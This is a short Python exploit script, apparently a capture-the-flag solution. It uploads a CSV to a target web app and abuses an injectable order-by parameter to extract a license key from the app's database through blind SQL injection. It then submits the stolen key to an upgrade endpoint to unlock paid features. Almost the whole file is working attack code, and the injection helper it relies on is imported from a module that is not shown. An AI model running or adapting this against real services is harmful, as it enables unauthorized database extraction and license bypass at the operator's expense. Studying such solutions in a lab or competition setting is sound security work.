import requests
from leaker import *
import sys
from bs4 import BeautifulSoup

host = sys.argv[1]
sess = requests.Session()

cols, data = get_table()
csv_data = ",".join(cols) + "\n" + "\n".join(",".join(map(str, row)) for row in data)
r = sess.post(f"{host}/create", files={"file": ("data.csv", csv_data)}, allow_redirects=False)
link = r.headers["Location"]

def query(col, od):
    res = sess.post(f"{host}{link}", data={"order-col": col, "order-od": od})
    soup = BeautifulSoup(res.text, "html.parser")
    table = []
    for row in soup.find_all("tr"):
        tds = row.find_all("td")
        if not tds:
            continue
        table.append([td.text for td in tds])
    return table

key = leak("SELECT key FROM license", query) + leak("SELECT substr(key, 129) FROM license", query)
r = sess.post(f"{host}{link.replace('view', 'upgrade')}", data={"key": key})
print(r.text)
